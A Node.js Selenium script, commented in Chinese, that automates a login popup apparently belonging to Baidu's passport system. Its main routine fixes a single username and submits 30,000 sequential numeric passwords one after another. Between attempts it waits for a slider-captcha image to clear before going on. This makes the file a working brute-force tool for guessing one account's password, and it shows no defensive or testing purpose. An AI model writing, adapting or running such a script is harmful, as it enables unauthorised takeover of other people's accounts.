const { Builder, By, until } = require("selenium-webdriver");
const chrome = require("selenium-webdriver/chrome");
const { fixChrome, sleep } = require("./../utils");

// 全局 WebDriver 实例
let driver;

// 获取 WebDriver 实例
function getDriver() {
    return driver;
}

/**
 * 使用指定的选项打开浏览器
 */
async function openBrowserWithOptions(url, browser) {
    const options = new chrome.Options();
    fixChrome(options)
    options.addArguments("--detach");

    if (browser === "chrome") {
        driver = await new Builder()
            .forBrowser("chrome")
            .setChromeOptions(options)
            .build();
        await driver.manage().window().maximize();
    } else {
        throw new Error("不支持的浏览器类型");
    }

    await driver.get(url);

    // 等待直到页面包含登录按钮dom
    const xpathLocator = "//*[@id='head']/div[4]/a";
    const locator = By.xpath(xpathLocator);
    await driver.wait(until.elementLocated(locator), 10000);
    return driver
}
// 点击登录按钮，并等待登录成功
async function getLoginDialog() {
    const xpathLocator = By.xpath("//*[@id='head']/div[4]/a")
    await driver.wait(until.elementLocated(xpathLocator), 10000);
    const goLoginButton = await driver.findElement(xpathLocator);

    // 检查元素是否可见
    await driver.wait(until.elementIsVisible(goLoginButton), 5000);
    await driver.executeScript("arguments[0].scrollIntoView(true);", goLoginButton);

    // 检查元素是否可点击
    await driver.wait(until.elementIsEnabled(goLoginButton), 5000);

    // 点击登录
    await goLoginButton.click();
}

async function runTask() {
    await inputAgree()

    const { name, passList } = getData();
    await inputUserName(name)
    for (const pass of passList) {
        await inputPassword(pass)
        await sleep(300)
        await submit()
        await verificationPicture()
    }
}

function getData() {
    return {
        name: "鸣礼",
    passList: Array.from({ length: 30000 }).fill(null).map((_, i) => 2376225 + i)
    }
}

async function inputUserName(name) {

    let driver = getDriver();

    const xpathLocator = By.xpath(
        "//*[@id='passport-login-pop']//input[@id='TANGRAM__PSP_11__userName']"
    )
    await driver.wait(until.elementLocated(xpathLocator), 3000);

    const userNameInput = await driver.findElement(xpathLocator);

    await driver.executeScript("arguments[0].value = arguments[1];", userNameInput, name);
}

async function inputPassword(pass) {
    let driver = getDriver();

    const xpathLocator = By.xpath(
        "//*[@id='passport-login-pop']//input[@id='TANGRAM__PSP_11__password']"
    )
    await driver.wait(until.elementLocated(xpathLocator), 3000);

    const passWordInput = await driver.findElement(xpathLocator);

    await driver.executeScript("arguments[0].value = arguments[1];", passWordInput, pass);
    console.log('passWordInput.value==>', passWordInput)
}

async function inputAgree() {
    let driver = getDriver();

    const xpathLocator = By.xpath(
        "//*[@id='passport-login-pop']//input[@id='TANGRAM__PSP_11__isAgree']"
    )
    await driver.wait(until.elementLocated(xpathLocator), 10000);

    const agreeInput = await driver.findElement(xpathLocator);

    await driver.executeScript("arguments[0].click();", agreeInput);
}

async function submit() {
    let driver = getDriver();

    const xpathLocator = By.xpath("//*[@id='passport-login-pop']//input[@id='TANGRAM__PSP_11__submit']")
    await driver.wait(until.elementLocated(xpathLocator), 3000);

    const submitInput = await driver.findElement(xpathLocator);

    await driver.executeScript("arguments[0].click();", submitInput);
}

async function verificationPicture() {
    return new Promise(async (resolve, reject) => {
        try {
            const xpathLocator = By.xpath("//*[@class='passMod_dialog-wrapper']//*[@class='passMod_dialog-body']//img[@class='passMod_spin-background']");
            await driver.wait(until.elementLocated(xpathLocator), 2000); // 增加等待时间至20秒
            const verImg = await driver.findElement(xpathLocator);
            console.log(verImg, 'verImg');


            (async function checkClass() {
                try {
                    const classAttribute = await verImg.getAttribute('class');
                    if (!classAttribute.includes('passMod_show')) {
                        resolve();
                    } else {
                        setTimeout(checkClass, 100); // 延迟检查，避免无限循环
                    }
                } catch (error) {
                    reject(error);
                }
            })();

        } catch (error) {
            resolve(); // 如果找不到元素，直接 resolve
            // if (error.name === 'NoSuchElementError') {
            // } else {
            //     console.error('Error locating the element:', error);
            //     throw error;
            // }
        }
    });
}

module.exports = {
    openBrowserWithOptions,
    getLoginDialog,
    runTask,
    getDriver
}